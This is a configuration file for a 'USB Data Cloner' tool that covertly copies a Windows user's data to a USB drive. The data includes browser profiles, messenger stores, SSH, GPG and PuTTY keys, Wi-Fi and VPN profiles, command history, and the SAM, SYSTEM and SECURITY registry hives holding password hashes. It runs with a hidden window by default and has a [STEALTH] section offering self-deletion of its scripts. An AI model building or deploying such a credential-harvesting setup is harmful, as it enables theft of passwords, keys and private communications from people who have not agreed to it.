; ============================================
; USB DATA CLONER CONFIGURATION
; Edit this file to change what gets copied
; ============================================

[SETTINGS]
; Set to YES to show progress window (NO for completely hidden)
SHOW_PROGRESS = NO

; Set to YES to copy subfolders recursively
RECURSIVE_COPY = YES

; Set to YES to only copy files modified in last X days (0 = all files)
INCREMENTAL_DAYS = 0

; Target drive letter on USB (leave empty for auto-detect)
TARGET_DRIVE = 

[FOLDERS_TO_COPY]
; Format: DisplayName|SourcePath|DestinationSubfolder
; Add or remove lines as needed
; Use %USERPROFILE% for current user's folder
; Use %APPDATA% for AppData\Roaming
; Use %LOCALAPPDATA% for AppData\Local

1 = Pictures|%USERPROFILE%\Pictures|Pictures
2 = Documents|%USERPROFILE%\Documents|Documents
3 = Desktop|%USERPROFILE%\Desktop|Desktop
4 = Downloads|%USERPROFILE%\Downloads|Downloads
5 = Videos|%USERPROFILE%\Videos|Videos
6 = Music|%USERPROFILE%\Music|Music
7 = Favorites|%USERPROFILE%\Favorites|Favorites
8 = Saved Games|%USERPROFILE%\Saved Games|Games
9 = Contacts|%USERPROFILE%\Contacts|Contacts
10 = Links|%USERPROFILE%\Links|Links
11 = Searches|%USERPROFILE%\Searches|Searches
12 = OneDrive|%USERPROFILE%\OneDrive|Cloud\OneDrive
13 = Chrome Bookmarks|%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks|Browsers\Chrome
14 = Chrome Data|%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default|Browsers\Chrome_Full
15 = Firefox Profiles|%APPDATA%\Mozilla\Firefox\Profiles|Browsers\Firefox
16 = Edge Data|%LOCALAPPDATA%\Microsoft\Edge\User Data\Default|Browsers\Edge
17 = WhatsApp|%USERPROFILE%\AppData\Local\WhatsApp|Messengers\WhatsApp
18 = Telegram|%APPDATA%\Telegram Desktop|Messengers\Telegram
19 = Discord|%APPDATA%\discord|Messengers\Discord
20 = Slack|%APPDATA%\Slack|Messengers\Slack
21 = SSH Keys|%USERPROFILE%\.ssh|Security\SSH
22 = GPG Keys|%USERPROFILE%\.gnupg|Security\GPG
23 = Putty Keys|%APPDATA%\Putty|Security\Putty
24 = Wi-Fi Profiles|%PROGRAMDATA%\Microsoft\Wlansvc\Profiles\Interfaces|Network\WiFi
25 = VPN Configs|%USERPROFILE%\.openvpn|Network\VPN
26 = PowerShell History|%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt|Logs\PowerShell
27 = Command History|%USERPROFILE%\.cmd_history|Logs\CMD
28 = Recent Files|%APPDATA%\Microsoft\Windows\Recent|System\Recent
29 = Recycle Bin|%SYSTEMDRIVE%\$Recycle.Bin|System\RecycleBin
30 = Temp Files|%TEMP%|System\Temp

[EXTRA_FILES]
; Specific single files to copy
; Format: Description|SourceFilePath|DestinationPath

1 = SAM Database|%WINDIR%\System32\config\SAM|Security\SAM
2 = SYSTEM Registry|%WINDIR%\System32\config\SYSTEM|Security\SYSTEM
3 = SECURITY Registry|%WINDIR%\System32\config\SECURITY|Security\SECURITY
4 = Software Registry|%WINDIR%\System32\config\SOFTWARE|Registry\SOFTWARE
5 = NTUSER.DAT|%USERPROFILE%\NTUSER.DAT|Registry\%username%_NTUSER
6 = USRCLASS.DAT|%LOCALAPPDATA%\Microsoft\Windows\UsrClass.dat|Registry\%username%_UsrClass

[EXTENSIONS_FILTER]
; Leave empty to copy ALL files
; Use semicolon to separate multiple extensions
; Example: .jpg;.png;.pdf;.docx;.xlsx;.pptx;.txt;.zip;.rar;.7z
INCLUDE_ONLY = 

; Folders to EXCLUDE (relative to source path)
; Use semicolon to separate multiple folders
EXCLUDE_FOLDERS = Temporary Internet Files;Temp;Cache;AppData\Local\Temp;Recycle.Bin;$RECYCLE.BIN;__MACOSX;Thumbs.db;.DS_Store

[STEALTH]
; Delete batch file after execution? (YES/NO)
SELF_DELETE = NO

; Delete VBS script after execution? (YES/NO)
DELETE_VBS = NO

; Minimum file size to copy in KB (0 = all files)
MIN_FILE_SIZE_KB = 0

; Maximum file size to copy in KB (0 = unlimited)
MAX_FILE_SIZE_KB = 0